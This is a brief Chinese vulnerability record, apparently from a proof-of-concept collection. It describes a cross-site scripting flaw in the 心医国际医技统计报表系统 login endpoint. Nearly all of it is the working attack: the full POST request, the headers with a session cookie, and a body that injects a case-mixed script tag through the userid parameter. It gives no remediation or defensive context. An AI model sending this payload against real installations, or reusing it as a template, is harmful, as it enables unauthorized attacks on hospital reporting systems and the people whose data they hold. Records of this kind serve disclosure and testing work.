# 心医国际医技统计报表系统存在XSS漏洞

- **系统**：心医国际医技统计报表系统　|　**类型**：XSS　|　**CVE**：—
- **请求**：`POST /EasyReport/login.do?method=handleRequestInternal HTTP/1.1`
- **关键头**：`Content-Length: 55`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: JSESSIONID=E590069FD1A0C5B3ACA365A9A270FD01`

**请求体 / payload**
```
pwd=admin&userid="><ScRiPt>alert(1)</sCrIpT>&userrole=0
>
```

**其他**
- 版本: 心医国际医技统计报表